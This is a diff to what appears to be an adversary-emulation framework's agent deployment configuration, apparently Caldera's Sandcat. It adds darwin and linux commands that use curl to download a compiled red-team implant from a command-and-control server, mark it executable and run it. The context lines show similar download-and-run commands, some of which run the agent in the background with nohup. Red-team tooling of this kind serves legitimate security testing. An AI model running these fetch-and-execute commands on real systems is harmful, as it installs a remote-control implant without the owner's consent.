@@ -26,6 +26,12 @@
               server="#{app.contact.http}";
               agent=$(curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:darwin" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
               nohup ./$agent -server $server &
+          - description: Compile red-team agent with a comma-separated list of extensions (requires GoLang).
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "gocat-extensions:#{agent.extensions}" $server/file/download > #{agents.implant_name};
+              chmod +x #{agents.implant_name};
+              ./#{agents.implant_name} -server $server -v
           - description: Download with GIST C2
             command: |
               server="#{app.contact.http}";
@@ -56,6 +62,12 @@
               server="#{app.contact.http}";
               agent=$(curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
               nohup ./$agent -server $server &
+          - description: Compile red-team agent with a comma-separated list of extensions (requires GoLang).
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:linux" -H "gocat-extensions:#{agent.extensions}" $server/file/download > #{agents.implant_name};
+              chmod +x #{agents.implant_name};
+              ./#{agents.implant_name} -server $server -group red -v
           - description: Download with GIST C2
             command: |
               server="#{app.contact.http}";
